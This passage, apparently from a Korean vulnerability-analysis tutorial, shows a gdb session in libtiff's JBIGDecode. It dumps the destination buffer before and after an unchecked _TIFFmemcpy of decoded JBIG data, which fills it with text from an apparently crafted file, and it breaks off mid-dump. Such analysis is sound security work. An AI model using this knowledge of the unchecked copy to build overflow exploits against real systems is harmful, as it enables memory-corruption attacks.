+=======================================================
+(gdb) list
+47    
+48   	 return 1;
+49    }
+50    
+51    static int JBIGDecode(TIFF* tif, uint8* buffer, tmsize_t size, uint16 s)
+52    {
+53   	 struct jbg_dec_state decoder;
+54   	 int decodeStatus = 0;
+55   	 unsigned char* pImage = NULL;
+56   	 (void) size, (void) s;
+(gdb)
+57    
+58   	 if (isFillOrder(tif, tif->tif_dir.td_fillorder))
+59   	 {
+60   		 TIFFReverseBits(tif->tif_rawdata, tif->tif_rawdatasize);
+61   	 }
+62    
+63   	 jbg_dec_init(&decoder);
+64    
+65    #if defined(HAVE_JBG_NEWLEN)
+66   	 jbg_newlen(tif->tif_rawdata, (size_t)tif->tif_rawdatasize);
+(gdb)
+67   	 /*
+68   	  * I do not check the return status of jbg_newlen because even if this
+69   	  * function fails it does not necessarily mean that decoding the image
+70   	  * will fail.  It is generally only needed for received fax images
+71   	  * that do not contain the actual length of the image in the BIE
+72   	  * header.  I do not log when an error occurs because that will cause
+73   	  * problems when converting JBIG encoded TIFF's to
+74   	  * PostScript.  As long as the actual image length is contained in the
+75   	  * BIE header jbg_dec_in should succeed.
+76   	  */
+(gdb)
+77    #endif /* HAVE_JBG_NEWLEN */
+78    
+79   	 decodeStatus = jbg_dec_in(&decoder, (unsigned char*)tif->tif_rawdata,
+80   				   (size_t)tif->tif_rawdatasize, NULL);
+81   	 if (JBG_EOK != decodeStatus)
+82   	 {
+83   		 /*
+84   		  * XXX: JBG_EN constant was defined in pre-2.0 releases of the
+85   		  * JBIG-KIT. Since the 2.0 the error reporting functions were
+86   		  * changed. We will handle both cases here.
+(gdb)
+87   		  */
+88   		 TIFFErrorExt(tif->tif_clientdata,
+89   			  	"JBIG", "Error (%d) decoding: %s",
+90   			  	decodeStatus,
+91    #if defined(JBG_EN)
+92   			  	jbg_strerror(decodeStatus, JBG_EN)
+93    #else
+94   			  	jbg_strerror(decodeStatus)
+95    #endif
+96   			  	);
+(gdb)
+97   		 jbg_dec_free(&decoder);
+98   		 return 0;
+99   	 }
+100    
+101   	 pImage = jbg_dec_getimage(&decoder, 0);
+102   	 _TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));
+103   	 jbg_dec_free(&decoder);
+104   	 return 1;
+105    }
+106    
+(gdb) break 102
+Breakpoint 3 at 0x7ffff7f6e5f4: file tif_jbig.c, line 102.
+(gdb) cont
+Continuing.
+
+Breakpoint 3, JBIGDecode (tif=0x5555555642a0, buffer=0x5555555654c0 "", size=<optimized out>, s=<optimized out>) at tif_jbig.c:102
+102   	 _TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));
+(gdb)
+=======================================================
+
+데이터 복사가 수행되기 전 buffer의 상태는 다음과 같다.
+
+=======================================================
+(gdb) x/32xw buffer
+0x5555555654c0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555654d0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555654e0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555654f0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565500:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565510:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565520:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565530:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565540:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565550:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565560:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565570:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565580:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565590:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555655a0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555655b0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x5555555655c0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555655d0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555655e0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555655f0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565600:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565610:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565620:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565630:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565640:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565650:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565660:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565670:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565680:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565690:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555656a0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555656b0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x5555555656c0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555656d0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555656e0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555656f0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565700:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565710:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565720:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565730:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565740:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565750:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565760:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565770:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565780:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565790:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555657a0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555657b0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x5555555657c0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555657d0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555657e0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555657f0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565800:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565810:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565820:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565830:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565840:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565850:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565860:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565870:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565880:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565890:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555658a0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555658b0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x5555555658c0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555658d0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555658e0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555658f0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565900:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565910:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565920:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565930:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565940:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565950:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565960:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565970:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565980:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565990:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555659a0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555659b0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x5555555659c0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555659d0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555659e0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5555555659f0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a00:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a10:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a20:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a30:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565a40:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a50:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a60:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a70:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a80:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565a90:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565aa0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ab0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565ac0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ad0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ae0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565af0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b00:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b10:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b20:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b30:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565b40:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b50:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b60:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b70:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b80:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565b90:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ba0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565bb0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565bc0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565bd0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565be0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565bf0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c00:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c10:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c20:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c30:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565c40:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c50:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c60:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c70:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c80:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565c90:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ca0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565cb0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565cc0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565cd0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ce0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565cf0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d00:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d10:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d20:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d30:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565d40:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d50:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d60:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d70:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d80:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565d90:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565da0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565db0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565dc0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565dd0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565de0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565df0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e00:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e10:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e20:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e30:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565e40:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e50:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e60:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e70:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e80:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565e90:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ea0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565eb0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565ec0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ed0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ee0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565ef0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f00:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f10:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f20:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f30:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565f40:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f50:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f60:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f70:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f80:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565f90:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565fa0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565fb0:    0x00000000    0x00000000    0x00000000    0x00000000
+(gdb)
+0x555555565fc0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565fd0:    0x00000000    0x00000000    0x00000000    0x00000000
+0x555555565fe0:    0x00000000    0x00000000    0x00001c11    0x00000000
+0x555555565ff0:    0x00010000    0xb8bc0000    0x01000000    0x02000000
+0x555555566000:    0x1c030008    0x71d2a4d2    0xc926e8f2    0x6e235a85
+0x555555566010:    0x8f6514c6    0xdce2672f    0xb4827244    0xc201ef58
+0x555555566020:    0x62e26349    0xb919916d    0x98a65ed1    0x8a8e9aa3
+0x555555566030:    0x0a08b4e6    0x5c677877    0xe0b1d9e9    0x3709ed31
+(gdb)
+0x555555566040:    0x8e29e92c    0x3800ffb0    0x99c11615    0x7afa5c5d
+0x555555566050:    0x39399d99    0x9c297e94    0xc9dfb1cd    0x9d08e711
+0x555555566060:    0x6652b61d    0xf447eb87    0xc11a3b6b    0x0a1140ac
+0x555555566070:    0x6d95041f    0xee06479d    0x8d38cfde    0x74686452
+0x555555566080:    0x6bd02c86    0x08ed6b03    0xe6c28622    0xaa229061
+0x555555566090:    0x2fbf4cf9    0xc2e32f0a    0x170ab93b    0xd39fc83a
+0x5555555660a0:    0xe8981e10    0xef8ebf10    0xd30b0cc2    0x97639822
+0x5555555660b0:    0x269d42be    0x20246e08    0x79fce1c5    0x8aa85a7a
+(gdb)
+=======================================================
+
+그럼 _TIFFmemcpy 다음 라인에 중지점을 걸고 프로그램을 계속 진행시키자.
+
+=======================================================
+(gdb) list
+97   		 jbg_dec_free(&decoder);
+98   		 return 0;
+99   	 }
+100    
+101   	 pImage = jbg_dec_getimage(&decoder, 0);
+102   	 _TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));
+103   	 jbg_dec_free(&decoder);
+104   	 return 1;
+105    }
+106    
+(gdb) break 103
+Breakpoint 4 at 0x7ffff7f6e607: file tif_jbig.c, line 103.
+(gdb) cont
+Continuing.
+
+Breakpoint 4, JBIGDecode (tif=0x5555555642a0, buffer=0x5555555654c0 "[Verse 1]\nSprengs\344tze f\374r Fahrtkosten und Pennpl\344tze\nWeil Ich f\374r solche Anl\344sse,Trend und das letzte Hemd setze\nMa\337geschneiderte Kragenweite, komm halt den Atem an\nWir stehen in ganzer Bandbreite vol"..., size=<optimized out>, s=<optimized out>) at tif_jbig.c:103
+103   	 jbg_dec_free(&decoder);
+(gdb)
+=======================================================
+
+여기서 다시 buffer의 상태를 확인하면 다음과 같은 결과를 얻는다.
+
+=======================================================
+(gdb) x/32xw buffer
+0x5555555654c0:    0x7265565b    0x31206573    0x70530a5d    0x676e6572
+0x5555555654d0:    0x7a74e473    0xfc662065    0x61462072    0x6b747268
+0x5555555654e0:    0x6574736f    0x6e75206e    0x65502064    0x6c706e6e
+0x5555555654f0:    0x657a74e4    0x6965570a    0x6349206c    0xfc662068
+0x555555565500:    0x6f732072    0x6568636c    0x6c6e4120    0x657373e4
+0x555555565510:    0x6572542c    0x7520646e    0x6420646e    0x6c207361
+0x555555565520:    0x747a7465    0x65482065    0x7320646d    0x657a7465
+0x555555565530:    0xdf614d0a    0x63736567    0x69656e68    0x74726564
+(gdb)
+0x555555565540:    0x724b2065    0x6e656761    0x74696577    0x6b202c65
+0x555555565550:    0x206d6d6f    0x746c6168    0x6e656420    0x65744120
+0x555555565560:    0x6e61206d    0x7269570a    0x65747320    0x206e6568
+0x555555565570:    0x67206e69    0x657a6e61    0x61422072    0x7262646e
+0x555555565580:    0x65746965    0x6c6f7620    0x2072656c    0x65746154
+0x555555565590:    0x6172646e    0x202c676e    0x61746e65    0x6e657472
+0x5555555655a0:    0x6e616420    0x69570a6e    0x76452065    0x74756c6f
+0x5555555655b0:    0x206e6f69    0x20656964    0x65647245    0x206e6920
+(gdb)
+0x5555555655c0:    0x65726849    0x6557206d    0x67656472    0x2c676e61
+0x5555555655d0:    0x72617720    0x65746574    0x616c206e    0x570a676e
+0x5555555655e0:    0x206e6e65    0x6c726865    0x20686369    0x7268e477
+0x5555555655f0:    0x64202c74    0x206e6e61    0xe4667265    0x20747268
+0x555555565600:    0x206e616d    0x6e6e6177    0x726f460a    0x72657665
+0x555555565610:    0x756f7920    0x6120676e    0x2c726562    0x3a796520
+0x555555565620:    0x61462220    0x70207269    0x2179616c    0x61642c22
+0x555555565630:    0x73692073    0x65672074    0x2075616e    0x20656977
+(gdb)
+0x555555565640:    0x20696562    0x67726553    0x0a6a6965    0x6b207345
+0x555555565650:    0x746d6d6f    0x6e616720    0x7561207a    0x65642066
+0x555555565660:    0x6e41206e    0x6675616c    0x0a6e6120    0x20667541
+0x555555565670:    0x65736e75    0x20726572    0x6675614c    0x6e686162
+0x555555565680:    0x61726220    0x74686375    0x6e616d20    0x656eb420
+0x555555565690:    0x6143206e    0x61766172    0x65440a6e    0x65572072
+0x5555555656a0:    0x73692067    0x61682074    0x77207472    0x4b206569
+0x5555555656b0:    0x7366706f    0x6e696574    0x616c6670    0x72657473
+(gdb)
+0x5555555656c0:    0x61727473    0x6e657373    0x63616e20    0x614b2068
+0x5555555656d0:    0x68636173    0x6e617473    0x6863490a    0x63616d20
+0x5555555656e0:    0x65642068    0x654c206e    0x61776869    0x206e6567
+0x5555555656f0:    0x72616c6b    0x646e7520    0x63616e20    0x72642068
+0x555555565700:    0x54206965    0x6e656761    0x72617720    0x63694e0a
+0x555555565710:    0x20737468    0x6c6e6965    0x6e656461    0x20726564
+0x555555565720:    0x3a736c61    0x53202220    0x69656863    0x7261626e
+0x555555565730:    0x69656b20    0x2072656e    0x22216164    0x6e65570a
+(gdb)
+0x555555565740:    0x7241206e    0x74696562    0x65696820    0x696e2072
+0x555555565750:    0x20746863    0x6661724b    0x616d2074    0x6557206c
+0x555555565760:    0x73692067    0x77202c74    0x72656469    0x2067656c
+0x555555565770:    0x0a217365    0x6e6e6544    0x736c6120    0x63e46e20
+0x555555565780:    0x65747368    0x65622073    0x27676577    0x68636920
+0x555555565790:    0xe4725420    0x2c736567    0x736c6120    0x72e47720
+0x5555555657a0:    0x20736520    0x72746554    0x550a7369    0x6e20646e
+0x5555555657b0:    0x65207275    0x70206e69    0x20726161    0x756e694d
+(gdb)
+0x5555555657c0:    0x206e6574    0x74e47073    0x6d207265    0x74737369
+0x5555555657d0:    0x6e616d20    0x206d6920    0x64617551    0x746e6172
+0x5555555657e0:    0x42206e65    0x0a617465    0x65736e55    0x206e6572
+0x5555555657f0:    0x736e6945    0x616c6863    0x6e692067    0x72657620
+0x555555565800:    0x63756c66    0x6e657468    0x77654e20    0x6d6e6f74
+0x555555565810:    0x72657465    0x485b0a0a    0x5d6b6f6f    0x706f4b0a
+0x555555565820:    0x74532066    0x206e6965    0x616c6650    0x72657473
+0x555555565830:    0x78382820    0x5b0a0a29    0x73726556    0x5d322065
+(gdb)
+0x555555565840:    0x6861460a    0x206e6572    0x6d6c6946    0x69772065
+0x555555565850:    0x794c2065    0x2c68636e    0x736f4c20    0x69482074
+0x555555565860:    0x61776867    0x6b202c79    0x206e6965    0x70726941
+0x555555565870:    0x0a79616c    0x6d6d6948    0x61666c65    0x73747268
+0x555555565880:    0x6d6d6f6b    0x6f646e61    0x66756120    0x6d656420
+0x555555565890:    0x67655720    0x72757a20    0x6e614720    0x79617767
+0x5555555658a0:    0x736e550a    0x74686369    0x65726162    0x72755420
+0x5555555658b0:    0x656c7562    0x6e657a6e    0x6564202c    0x64206e6e
+(gdb)
+0x5555555658c0:    0x52207265    0x65206675    0x20746c69    0x20736e75
+0x5555555658d0:    0x72726f76    0x0a737561    0x6863694e    0x61702074
+0x5555555658e0:    0x61626b63    0x77202c72    0x53206569    0x6c616863
+0x5555555658f0:    0x4d202e6c    0x656c6965    0x6574736e    0x20656e69
+0x555555565900:    0x6d696562    0x75614420    0x616c7265    0x420a6675
+0x555555565910:    0x68616665    0x206eb472    0x20656964    0x69686373
+0x555555565920:    0x20656665    0x6e686142    0x6977202c    0x61502065
+0x555555565930:    0x2d736972    0x616b6144    0x614a0a72    0x65762067
+(gdb)
+0x555555565940:    0x726f6c72    0x73656e65    0x73695720    0x206e6573
+0x555555565950:    0x7369777a    0x6e656863    0x6b654d20    0x7520616b
+0x555555565960:    0x4d20646e    0x6e696465    0x654d0a61    0x46207268
+0x555555565970:    0x65676e69    0x6d692072    0x69705320    0x61206c65
+0x555555565980:    0x6120736c    0x20656c6c    0x656d7241    0x6e6f7620
+0x555555565990:    0x6c614b20    0x0a616d69    0x65727545    0x65725420
+0x5555555659a0:    0x6e656666    0x66666520    0x69746b65    0x77202c76
+0x5555555659b0:    0x4b206569    0x65666e6f    0x7a6e6572    0xfc206e65
+(gdb)
+0x5555555659c0:    0x73726562    0x696c4b20    0x420a616d    0x68207369
+0x5555555659d0:    0x68726569    0x67207265    0xb4676e69    0x75672073
+0x5555555659e0:    0x64202c74    0x2068636f    0x4820614c    0x656e6961
+0x5555555659f0:    0x757a202c    0x6c656976    0x74755720    0x6d6f4b0a
+0x555555565a00:    0x206e656d    0x746c6573    0x61206e65    0x69656c6c
+0x555555565a10:    0x49222e6e    0x6d206863    0x206e6965    0x65672035
+0x555555565a20:    0x206e6567    0x656e6965    0x4b0a226e    0x6d6d7572
+0x555555565a30:    0x6f542065    0x6e657275    0x66756120    0x6e6f5420
+(gdb)
+0x555555565a40:    0x72757073    0x4b0a6e65    0x74696d75    0x61206565
+0x555555565a50:    0x4f206675    0x65737964    0x77202c65    0x6e656865
+0x555555565a60:    0x74696d20    0x66664520    0x64207465    0x68637275
+0x555555565a70:    0x65696420    0x696e5320    0x2d726570    0x656c6c41
+0x555555565a80:    0x75440a65    0x6e686120    0x6e207473    0x77207275
+0x555555565a90:    0x6b207361    0x746d6d6f    0x7573202c    0x74736863
+0x555555565aa0:    0x6e656420    0x6e655720    0x75706564    0x20746b6e
+0x555555565ab0:    0x48206d61    0x7a69726f    0x0a746e6f    0x6e696544
+(gdb)
+0x555555565ac0:    0x63614e20    0x63697268    0x6e657468    0x6e656964
+0x555555565ad0:    0x77207473    0x746c68fc    0x63616e20    0x70532068
+0x555555565ae0:    0x6e657275    0x206e6120    0x20726564    0x6e6f7246
+0x555555565af0:    0x65570a74    0x49206c69    0x6974736e    0x20746b6e
+0x555555565b00:    0x20736e75    0x6d65696e    0x20736c61    0x6b6e696c
+0x555555565b10:    0x73202c74    0x65686574    0x6977206e    0x61642072
+0x555555565b20:    0x206f7720    0x20726977    0x646e6973    0x6569440a
+0x555555565b30:    0x6c6f6720    0x656e6564    0x74694d20    0x202e6574
+(gdb)
+0x555555565b40:    0x646e6146    0x6e656420    0x67655720    0x72756420
+0x555555565b50:    0x20736863    0x7962614c    0x746e6972    0xfc520a68
+0x555555565b60:    0x6e657473    0x66756120    0x65697720    0x63695620
+0x555555565b70:    0x2d726f74    0x72616843    0x2c65696c    0x72617420
+0x555555565b80:    0x206e656e    0x20656964    0x7473fc52    0x73676e75
+0x555555565b90:    0x75646e69    0x69727473    0x6f4c0a65    0x656c616b
+0x555555565ba0:    0x70615220    0x6174726f    0x202c6567    0x6d697250
+0x555555565bb0:    0x69542065    0x202c656d    0x2e452e43    0x5b0a0a54
+(gdb)
+0x555555565bc0:    0x6b6f6f48    0x5b0a0a5d    0x73726556    0x5d332065
+0x555555565bd0:    0x616c4b0a    0x64202c72    0x20737361    0x656b7245
+0x555555565be0:    0x6e746e6e    0x68207369    0x20747261    0x6e696573
+0x555555565bf0:    0x6e616b20    0x77202c6e    0x64206569    0x48207361
+0x555555565c00:    0x616d7261    0x65676e6e    0x6ee47473    0x73696e64
+0x555555565c10:    0x7269570a    0x69442064    0x69762072    0x656c6c65
+0x555555565c20:    0x74686369    0x6d757a20    0x72655620    0x676ee468
+0x555555565c30:    0x0a73696e    0x74654a22    0x6220747a    0x676e6972
+(gdb)
+0x555555565c40:    0x6e686920    0x63696e20    0x69207468    0x6542206e
+0x555555565c50:    0x6ee47264    0x73696e67    0x6f530a22    0x2074736e
+0x555555565c60:    0x68657264    0x68634920    0x72756420    0x77206863
+0x555555565c70:    0x45206569    0x694e206c    0x0a736ff1    0x66706f4b
+0x555555565c80:    0x7373fc6e    0x6e6b2065    0x656b6361    0x6164206e
+0x555555565c90:    0x470a6e6e    0x6e656265    0x6e656420    0x6e6f5420
+0x555555565ca0:    0x206e6120    0x20656977    0x52206e69    0x202c6d6f
+0x555555565cb0:    0x706d6153    0x72746569    0x736f6e69    0x7362410a
+(gdb)
+0x555555565cc0:    0x656b6361    0x6977206e    0x65562065    0x6964656e
+0x555555565cd0:    0x65772067    0x6e656472    0x72697720    0x20686520
+0x555555565ce0:    0x6863696e    0x614d0a74    0x20746863    0x68637565
+0x555555565cf0:    0x20616420    0x6e69656b    0x65472065    0x6b6e6164
+0x555555565d00:    0x64206e65    0x0a6d7572    0x20726957    0x6b636170
+0x555555565d10:    0x64206e65    0x51206e65    0x746e6175    0x70736e65
+0x555555565d20:    0x676e7572    0x6977202c    0x6f732065    0x50206eb4
+0x555555565d30:    0x20726161    0x66656c45    0x65746e61    0x6e756a6e
+(gdb)
+0x555555565d40:    0x0a6e6567    0x2074694d    0x65676e75    0x6c617073
+0x555555565d50:    0x656e6574    0x755a206e    0x6e65676e    0xe4727020
+0x555555565d60:    0x6d207467    0x206e6965    0x646e754d    0x69656d20
+0x555555565d70:    0x6d55206e    0x646c6566    0x68e4570a    0x646e6572
+0x555555565d80:    0x20726520    0x7475616c    0x65697720    0x48206eb4
+0x555555565d90:    0x20646e75    0x6c6c6562    0x6d202c74    0x746b6c65
+0x555555565da0:    0x69656d20    0x6547206e    0x6e726968    0x69656d20
+0x555555565db0:    0x5520656e    0x6c65776d    0x6c4b0a74    0x202c7261
+(gdb)
+0x555555565dc0:    0x73736164    0x72686920    0x61726420    0x74736675
+0x555555565dd0:    0x2c746865    0x6c616620    0x7520736c    0x7265736e
+0x555555565de0:    0x65522065    0x756e6863    0x6120676e    0x65676675
+0x555555565df0:    0x530a7468    0x20646965    0x20726869    0x41206d69
+0x555555565e00:    0x68637372    0x6977202c    0x206eb465    0x79646f42
+0x555555565e10:    0x6b636170    0x64207265    0x64207265    0x66756172
+0x555555565e20:    0x74686567    0x7261480a    0x65772074    0x6d206e6e
+0x555555565e30:    0x64206e61    0x66756172    0x70617020    0x206e6570
+(gdb)
+0x555555565e40:    0x69656c62    0x202c7462    0x20656977    0x20686349
+0x555555565e50:    0x20667561    0x6e69656d    0x4b207265    0x68646e69
+0x555555565e60:    0x0a746965    0x42206e49    0x7568636f    0x61572d6d
+0x555555565e70:    0x6e657474    0x65686373    0x203a6469    0x66756153
+0x555555565e80:    0x64726f6d    0x6f4b202c    0x202d7070    0x64726f42
+0x555555565e90:    0x69657473    0x7361646e    0x676e6968    0x706f540a
+0x555555565ea0:    0x616d7320    0x6e696873    0x6977202c    0x65642065
